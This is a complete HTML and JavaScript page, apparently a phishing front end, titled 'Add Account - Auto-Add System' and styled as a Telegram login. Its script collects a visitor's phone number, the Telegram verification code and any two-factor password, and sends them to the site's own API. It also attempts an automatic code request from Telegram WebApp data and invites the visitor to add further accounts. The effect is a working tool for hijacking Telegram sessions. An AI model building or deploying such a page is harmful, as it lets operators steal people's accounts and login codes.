<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Account - Auto-Add System</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            background: #0a0a0f;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #fff;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
        }

        .login-card {
            background: rgba(18, 18, 30, 0.9);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 32px 24px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }

        .step-title {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: center;
        }

        .step-description {
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.9rem;
            margin-bottom: 24px;
            text-align: center;
            line-height: 1.5;
        }

        .phone-input-group {
            position: relative;
            margin-bottom: 16px;
        }

        .phone-input-group input {
            width: 100%;
            padding: 14px 16px;
            padding-left: 40px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: all 0.3s;
        }

        .phone-input-group input:focus {
            border-color: #8a2be2;
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.2);
        }

        .phone-input-group .prefix {
            position: absolute;
            left: 16px;
            top: 14px;
            color: #8a2be2;
            font-weight: 700;
            font-size: 1rem;
        }

        .code-container {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 24px 0;
        }

        .code-box {
            width: 54px;
            height: 64px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            color: #fff;
            font-size: 1.8rem;
            font-weight: 700;
            text-align: center;
            line-height: 60px;
            transition: all 0.3s;
        }

        .code-box.filled {
            border-color: rgba(138, 43, 226, 0.6);
            background: rgba(138, 43, 226, 0.15);
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.3);
        }

        .code-box.active {
            border-color: rgba(255, 20, 147, 0.7);
            box-shadow: 0 0 25px rgba(255, 20, 147, 0.4);
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { border-color: rgba(255, 20, 147, 0.7); }
            50% { border-color: rgba(138, 43, 226, 0.9); }
        }

        .hidden-input {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }

        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 14px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 10px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #8a2be2, #ff1493);
            color: white;
            box-shadow: 0 8px 30px rgba(138, 43, 226, 0.3);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(138, 43, 226, 0.5);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-telegram {
            background: linear-gradient(135deg, #0088cc, #006699);
            color: white;
            box-shadow: 0 8px 30px rgba(0, 136, 204, 0.3);
        }

        .btn-telegram:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(0, 136, 204, 0.5);
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.08);
            color: rgba(255, 255, 255, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.15);
        }

        .btn-outline {
            background: transparent;
            color: rgba(255, 255, 255, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 0.85rem;
        }

        .error-message {
            background: rgba(255, 68, 68, 0.15);
            color: #ff6b6b;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            display: none;
            border-left: 3px solid #ff4444;
        }

        .success-message {
            background: rgba(32, 178, 170, 0.15);
            color: #20b2aa;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            display: none;
            border-left: 3px solid #20b2aa;
        }

        .error-message.show, .success-message.show {
            display: block;
        }

        .loading-spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .phone-display {
            text-align: center;
            background: rgba(138, 43, 226, 0.1);
            border-radius: 12px;
            padding: 10px;
            margin-bottom: 16px;
            font-size: 0.9rem;
            color: #b388ff;
        }

        .attempt-counter {
            text-align: center;
            color: #ffaa00;
            font-size: 0.8rem;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <!-- Page 1: Phone Entry -->
            <div id="page1">
                <div class="step-title">🔐 Telegram Login</div>
                <div class="step-description">
                    Enter your phone number to receive a verification code
                </div>

                <div class="error-message" id="error1"></div>
                <div class="success-message" id="success1"></div>

                <div class="phone-input-group">
                    <span class="prefix">+</span>
                    <input type="tel" id="phoneInput" 
                           placeholder="Phone number with country code" 
                           inputmode="numeric"
                           autocomplete="tel">
                </div>

                <button class="btn btn-primary" id="sendCodeBtn" onclick="sendVerificationCode()">
                    📱 Send Code
                </button>

                <button class="btn btn-telegram" id="sharePhoneBtn" onclick="requestPhoneViaTelegram()" style="display: none;">
                    🔗 Share via Telegram
                </button>

                <div style="margin-top: 16px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 12px; font-size: 0.8rem; color: rgba(255,255,255,0.5); text-align: center;">
                    Example: 251912345678 (without +)
                </div>
            </div>

            <!-- Page 2: Code Verification -->
            <div id="page2" style="display: none;">
                <div class="step-title">📱 Verify Code</div>
                <div class="step-description">
                    Enter the 5-digit code sent to your Telegram
                </div>

                <div class="phone-display" id="phoneDisplay" style="display: none;">
                    📱 Code sent to: <strong id="phoneDisplayText"></strong>
                </div>

                <div class="error-message" id="error2"></div>
                <div class="success-message" id="success2"></div>

                <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
                
                <div class="code-container" id="codeBoxes" onclick="focusCodeInput()">
                    <div class="code-box" id="box1"></div>
                    <div class="code-box" id="box2"></div>
                    <div class="code-box" id="box3"></div>
                    <div class="code-box" id="box4"></div>
                    <div class="code-box" id="box5"></div>
                </div>

                <div style="text-align: center; color: rgba(255,255,255,0.4); font-size: 0.8rem; margin-bottom: 16px;">
                    Code auto-submits when complete
                </div>

                <div id="passwordGroup" style="display: none;">
                    <input type="password" id="password" 
                           placeholder="2FA Password (if enabled)"
                           style="width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.05); 
                                  border: 2px solid rgba(255,255,255,0.15); border-radius: 14px; 
                                  color: #fff; font-size: 1rem; outline: none; margin-bottom: 16px;">
                </div>

                <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
                    ✅ Verify & Connect
                </button>

                <button class="btn btn-outline" onclick="backToPhoneEntry()">
                    ← Change Phone Number
                </button>

                <div class="attempt-counter" id="attemptCounter"></div>
            </div>

            <!-- Page 3: Success -->
            <div id="page3" style="display: none;">
                <div style="font-size: 4rem; text-align: center; margin: 20px 0;">✅</div>
                <div class="step-title" style="color: #20b2aa;">Connected Successfully!</div>
                <div class="step-description" id="successAccountInfo">
                    Your account has been connected and is now active.
                </div>
                
                <button class="btn btn-primary" onclick="window.location.href='/dashboard'">
                    📊 Go to Dashboard
                </button>
                
                <button class="btn btn-outline" onclick="addAnotherAccount()">
                    ➕ Add Another Account
                </button>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // GLOBAL STATE
        // ============================================
        var currentSessionId = null;
        var currentPhone = '';
        var currentMaskedPhone = '';
        var isAutoVerifying = false;
        var codeAttempts = 0;
        var telegramUser = null;

        // DOM elements
        var hiddenInput = document.getElementById('hiddenCodeInput');
        var boxes = [
            document.getElementById('box1'),
            document.getElementById('box2'),
            document.getElementById('box3'),
            document.getElementById('box4'),
            document.getElementById('box5')
        ];

        // ============================================
        // INITIALIZATION
        // ============================================
        
        window.addEventListener('load', function() {
            console.log('🚀 Login page loaded');
            
            // Detect Telegram environment
            detectTelegramEnvironment();
            
            // Focus phone input
            setTimeout(function() {
                document.getElementById('phoneInput').focus();
            }, 500);
            
            // Setup event listeners
            setupEventListeners();
        });

        function detectTelegramEnvironment() {
            // Check if we're in Telegram
            if (window.Telegram && window.Telegram.WebApp) {
                try {
                    var tg = window.Telegram.WebApp;
                    tg.ready();
                    tg.expand();
                    
                    console.log('Telegram WebApp detected, version:', tg.version);
                    
                    // Get user info if available
                    if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                        telegramUser = tg.initDataUnsafe.user;
                        console.log('User detected:', telegramUser.first_name);
                        
                        // Show Telegram share button
                        document.getElementById('sharePhoneBtn').style.display = 'block';
                        
                        // Try auto-login
                        tryAutoLogin();
                    }
                } catch(e) {
                    console.log('Telegram WebApp init error:', e);
                }
            }
            
            // Check URL params for Telegram data
            var queryString = window.location.search.substring(1);
            if (queryString && queryString.indexOf('user=') !== -1) {
                try {
                    var urlParams = new URLSearchParams(queryString);
                    var userParam = urlParams.get('user');
                    if (userParam) {
                        telegramUser = JSON.parse(decodeURIComponent(userParam));
                        console.log('User from URL:', telegramUser.first_name);
                        document.getElementById('sharePhoneBtn').style.display = 'block';
                        tryAutoLogin();
                    }
                } catch(e) {}
            }
        }

        function setupEventListeners() {
            // Phone input Enter key
            document.getElementById('phoneInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') sendVerificationCode();
            });

            // Password input Enter key
            document.getElementById('password').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') verifyCode();
            });

            // Hidden code input events
            hiddenInput.addEventListener('input', function() {
                var value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
                this.value = value;
                updateCodeBoxes();
            });

            hiddenInput.addEventListener('paste', function(e) {
                e.preventDefault();
                var text = (e.clipboardData || window.clipboardData).getData('text');
                var digits = text.replace(/[^0-9]/g, '').slice(0, 5);
                this.value = digits;
                updateCodeBoxes();
            });

            hiddenInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') { 
                    e.preventDefault(); 
                    verifyCode(); 
                }
            });
        }

        // ============================================
        // AUTO-LOGIN CHECK
        // ============================================
        
        async function tryAutoLogin() {
            if (!telegramUser || !telegramUser.id) return;
            
            var initData = '';
            if (window.Telegram && window.Telegram.WebApp) {
                initData = window.Telegram.WebApp.initData || '';
            }
            
            if (!initData) {
                var queryString = window.location.search.substring(1);
                if (queryString) initData = queryString;
            }
            
            if (!initData) return;
            
            console.log('Attempting auto-login...');
            
            try {
                var response = await fetch('/api/telegram-auto-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        initData: initData, 
                        user: telegramUser 
                    })
                });

                var data = await response.json();
                console.log('Auto-login response:', data);
                
                if (data.success) {
                    // Code sent automatically
                    currentSessionId = data.session_id;
                    currentMaskedPhone = data.phone_masked || '';
                    currentPhone = data.phone_masked || '';
                    
                    showSuccess('Code sent to your phone automatically!', 1);
                    
                    setTimeout(function() {
                        showCodeVerificationPage(currentMaskedPhone);
                    }, 1000);
                } else if (data.needs_phone) {
                    // Need phone number
                    console.log('Phone number needed');
                }
            } catch (error) {
                console.error('Auto-login error:', error);
            }
        }

        // ============================================
        // PHONE SHARING VIA TELEGRAM
        // ============================================
        
        function requestPhoneViaTelegram() {
            if (!window.Telegram || !window.Telegram.WebApp) {
                showError('Please open this page from Telegram app', 1);
                return;
            }
            
            var tg = window.Telegram.WebApp;
            var button = document.getElementById('sharePhoneBtn');
            
            setLoadingBtn(button, true, 'Requesting...');
            
            try {
                if (typeof tg.requestContact === 'function') {
                    tg.requestContact(function(success, response) {
                        setLoadingBtn(button, false);
                        
                        if (!success) {
                            showError('Phone sharing was declined. Please enter manually.', 1);
                            return;
                        }
                        
                        console.log('Phone share response:', response);
                        
                        // Try to extract phone from response
                        var phone = extractPhoneNumber(response);
                        
                        if (phone) {
                            document.getElementById('phoneInput').value = phone.replace('+', '');
                            sendVerificationCode(phone);
                        } else {
                            showError('Could not get phone number. Please enter manually.', 1);
                        }
                    });
                } else {
                    setLoadingBtn(button, false);
                    showError('Phone sharing not supported. Please enter manually.', 1);
                }
            } catch (error) {
                console.error('Phone request error:', error);
                setLoadingBtn(button, false);
                showError('Error requesting phone. Please enter manually.', 1);
            }
        }

        function extractPhoneNumber(response) {
            if (!response) return null;
            
            // If it's a string
            if (typeof response === 'string') {
                var cleaned = response.replace(/[^0-9+]/g, '');
                if (cleaned.match(/^\+?[0-9]{7,15}$/)) return cleaned;
            }
            
            // If it's an object
            if (typeof response === 'object') {
                if (response.phone_number) return response.phone_number;
                if (response.phone) return response.phone;
                if (response.contact && response.contact.phone_number) return response.contact.phone_number;
                
                // Try to find in responseUnsafe
                if (response.responseUnsafe && response.responseUnsafe.contact) {
                    return response.responseUnsafe.contact.phone_number;
                }
            }
            
            // Try JSON string
            try {
                var str = JSON.stringify(response);
                var match = str.match(/\+[0-9]{7,15}/);
                if (match) return match[0];
            } catch(e) {}
            
            return null;
        }

        // ============================================
        // SEND VERIFICATION CODE
        // ============================================
        
        async function sendVerificationCode(phoneOverride) {
            var phoneInput = document.getElementById('phoneInput');
            var phone = phoneOverride || phoneInput.value.trim();
            
            // Remove any non-numeric characters except +
            phone = phone.replace(/[^0-9+]/g, '');
            
            // Add + if not present
            if (phone && phone.indexOf('+') !== 0) {
                phone = '+' + phone;
            }
            
            // Validate phone number
            if (!phone || phone.length < 8) {
                showError('Please enter a valid phone number with country code', 1);
                phoneInput.focus();
                return;
            }
            
            // Minimum validation: must have at least 8 digits after +
            var digitsOnly = phone.replace(/[^0-9]/g, '');
            if (digitsOnly.length < 7) {
                showError('Phone number too short. Include country code.', 1);
                phoneInput.focus();
                return;
            }
            
            currentPhone = phone;
            var button = document.getElementById('sendCodeBtn');
            
            setLoadingBtn(button, true, 'Sending code...');
            hideError(1);
            hideSuccess(1);
            
            try {
                var payload = {
                    phone: phone,
                    telegramId: telegramUser ? String(telegramUser.id) : '',
                    firstName: telegramUser ? (telegramUser.first_name || '') : '',
                    lastName: telegramUser ? (telegramUser.last_name || '') : '',
                    username: telegramUser ? (telegramUser.username || '') : ''
                };
                
                console.log('Sending verification request:', { phone: phone.substring(0, 4) + '****' });
                
                var response = await fetch('/api/share-phone', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                var data = await response.json();
                console.log('Server response:', data);
                
                setLoadingBtn(button, false);
                
                if (data.success) {
                    currentSessionId = data.session_id;
                    currentMaskedPhone = data.phone_masked || phone;
                    
                    showSuccess('✅ Code sent! Check your Telegram app.', 1);
                    
                    // Switch to code verification page
                    setTimeout(function() {
                        showCodeVerificationPage(currentMaskedPhone);
                    }, 500);
                    
                } else if (data.error) {
                    // Handle specific errors
                    if (data.error.includes('Flood') || data.error.includes('Too many')) {
                        showError('Too many attempts. Please wait a few minutes and try again.', 1);
                    } else if (data.error.includes('Invalid phone')) {
                        showError('Invalid phone number. Check the number and try again.', 1);
                    } else {
                        showError(data.error, 1);
                    }
                } else {
                    showError('Failed to send code. Please try again.', 1);
                }
                
            } catch (error) {
                console.error('Send code error:', error);
                setLoadingBtn(button, false);
                
                // Try the alternative endpoint
                try {
                    console.log('Trying alternative endpoint...');
                    var altResponse = await fetch('/api/add-account', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            phone: phone, 
                            telegramId: telegramUser ? String(telegramUser.id) : '' 
                        })
                    });
                    
                    var altData = await altResponse.json();
                    console.log('Alternative response:', altData);
                    
                    if (altData.success) {
                        currentSessionId = altData.session_id;
                        currentMaskedPhone = phone;
                        showCodeVerificationPage(phone);
                    } else {
                        showError('Network error. Please check your connection and try again.', 1);
                    }
                } catch (altError) {
                    showError('Network error. Please check your connection and try again.', 1);
                }
            }
        }

        // ============================================
        // CODE VERIFICATION PAGE
        // ============================================
        
        function showCodeVerificationPage(phoneMasked) {
            document.getElementById('page1').style.display = 'none';
            document.getElementById('page2').style.display = 'block';
            document.getElementById('page3').style.display = 'none';
            
            if (phoneMasked) {
                document.getElementById('phoneDisplay').style.display = 'block';
                document.getElementById('phoneDisplayText').textContent = phoneMasked;
            }
            
            resetCodeInput();
            setTimeout(function() {
                focusCodeInput();
            }, 300);
        }

        function resetCodeInput() {
            hiddenInput.value = '';
            updateCodeBoxes();
            codeAttempts = 0;
            isAutoVerifying = false;
            document.getElementById('attemptCounter').textContent = '';
            document.getElementById('password').value = '';
            document.getElementById('passwordGroup').style.display = 'none';
            hideError(2);
            hideSuccess(2);
        }

        function focusCodeInput() {
            hiddenInput.focus();
            updateActiveBox();
        }

        function updateActiveBox() {
            var code = hiddenInput.value.replace(/[^0-9]/g, '');
            boxes.forEach(function(box, i) {
                box.classList.remove('active');
                if (i === code.length && code.length < 5) box.classList.add('active');
            });
        }

        function updateCodeBoxes() {
            var code = hiddenInput.value.replace(/[^0-9]/g, '').slice(0, 5);
            boxes.forEach(function(box, i) {
                box.classList.remove('filled', 'active', 'error');
                if (i < code.length) {
                    box.textContent = code[i];
                    box.classList.add('filled');
                } else {
                    box.textContent = '';
                }
            });
            
            if (code.length < 5) {
                boxes[code.length].classList.add('active');
            }
            
            hideError(2);
            
            // Auto-submit when 5 digits are entered
            if (code.length === 5 && !isAutoVerifying) {
                isAutoVerifying = true;
                var needPassword = document.getElementById('passwordGroup').style.display === 'block';
                
                if (!needPassword) {
                    setTimeout(function() {
                        if (hiddenInput.value.replace(/[^0-9]/g, '').length === 5) {
                            performVerification(code, '');
                        } else {
                            isAutoVerifying = false;
                        }
                    }, 500);
                } else {
                    isAutoVerifying = false;
                }
            }
        }

        // ============================================
        // VERIFY CODE
        // ============================================
        
        async function verifyCode() {
            var code = hiddenInput.value.replace(/[^0-9]/g, '');
            
            if (code.length !== 5) {
                showError('Please enter the complete 5-digit code', 2);
                focusCodeInput();
                return;
            }
            
            var needPassword = document.getElementById('passwordGroup').style.display === 'block';
            var passwordInput = document.getElementById('password');
            
            if (needPassword && !passwordInput.value) {
                showError('Please enter your 2FA password', 2);
                passwordInput.focus();
                return;
            }
            
            var button = document.getElementById('verifyBtn');
            setLoadingBtn(button, true, 'Verifying...');
            hideError(2);
            
            await performVerification(code, passwordInput.value);
        }

        async function performVerification(code, password) {
            try {
                var payload = {
                    code: code,
                    session_id: currentSessionId,
                    password: password || ''
                };
                
                console.log('Verifying code...');
                
                var response = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                var data = await response.json();
                console.log('Verification response:', data);
                
                setLoadingBtn(document.getElementById('verifyBtn'), false);
                
                if (data.success) {
                    // Verification successful
                    showSuccessPage(data);
                    
                } else if (data.need_password) {
                    // 2FA required
                    document.getElementById('passwordGroup').style.display = 'block';
                    document.getElementById('password').focus();
                    showError('Two-factor authentication is enabled. Please enter your password.', 2);
                    isAutoVerifying = false;
                    
                } else {
                    // Verification failed
                    codeAttempts++;
                    var remaining = 5 - codeAttempts;
                    
                    if (remaining > 0) {
                        showError((data.error || 'Invalid code') + '. ' + remaining + ' attempts remaining.', 2);
                        document.getElementById('attemptCounter').textContent = remaining + ' attempts remaining';
                        resetCodeInput();
                        focusCodeInput();
                    } else {
                        showError('Too many failed attempts. Please start over.', 2);
                        setTimeout(backToPhoneEntry, 2000);
                    }
                    
                    isAutoVerifying = false;
                }
                
            } catch (error) {
                console.error('Verification error:', error);
                setLoadingBtn(document.getElementById('verifyBtn'), false);
                showError('Network error. Please try again.', 2);
                isAutoVerifying = false;
            }
        }

        // ============================================
        // SUCCESS PAGE
        // ============================================
        
        function showSuccessPage(data) {
            document.getElementById('page1').style.display = 'none';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'block';
            
            var accountInfo = '';
            if (data.account) {
                accountInfo = '<strong>' + (data.account.name || 'User') + '</strong>';
                if (currentPhone) {
                    accountInfo += '<br>📱 ' + currentPhone.substring(0, 4) + '****';
                }
                if (data.account_age) {
                    accountInfo += '<br>📅 Account age: ' + data.account_age;
                }
            }
            
            document.getElementById('successAccountInfo').innerHTML = accountInfo || 'Your account is now active!';
        }

        // ============================================
        // NAVIGATION
        // ============================================
        
        function backToPhoneEntry() {
            document.getElementById('page1').style.display = 'block';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'none';
            resetCodeInput();
            hideError(1);
            hideError(2);
            currentSessionId = null;
            document.getElementById('phoneInput').focus();
        }

        function addAnotherAccount() {
            document.getElementById('page1').style.display = 'block';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'none';
            document.getElementById('phoneInput').value = '';
            resetCodeInput();
            hideError(1);
            hideError(2);
            currentSessionId = null;
            currentPhone = '';
            document.getElementById('phoneInput').focus();
        }

        // ============================================
        // UI HELPERS
        // ============================================
        
        function showError(message, pageNum) {
            pageNum = pageNum || 1;
            var el = document.getElementById('error' + pageNum);
            if (el) {
                el.textContent = message;
                el.classList.add('show');
                setTimeout(function() { 
                    el.classList.remove('show'); 
                }, 8000);
            }
        }

        function hideError(pageNum) {
            pageNum = pageNum || 1;
            var el = document.getElementById('error' + pageNum);
            if (el) el.classList.remove('show');
        }

        function showSuccess(message, pageNum) {
            pageNum = pageNum || 1;
            var el = document.getElementById('success' + pageNum);
            if (el) {
                el.textContent = message;
                el.classList.add('show');
                setTimeout(function() { 
                    el.classList.remove('show'); 
                }, 5000);
            }
        }

        function hideSuccess(pageNum) {
            pageNum = pageNum || 1;
            var el = document.getElementById('success' + pageNum);
            if (el) el.classList.remove('show');
        }

        function setLoadingBtn(button, isLoading, text) {
            if (!button) return;
            button.disabled = isLoading;
            if (isLoading) {
                button.innerHTML = '<span class="loading-spinner"></span><span>' + (text || 'Processing...') + '</span>';
            } else {
                // Restore original text
                if (button.id === 'sendCodeBtn') {
                    button.innerHTML = '📱 Send Code';
                } else if (button.id === 'verifyBtn') {
                    button.innerHTML = '✅ Verify & Connect';
                } else if (button.id === 'sharePhoneBtn') {
                    button.innerHTML = '🔗 Share via Telegram';
                }
            }
        }
    </script>
</body>
</html>
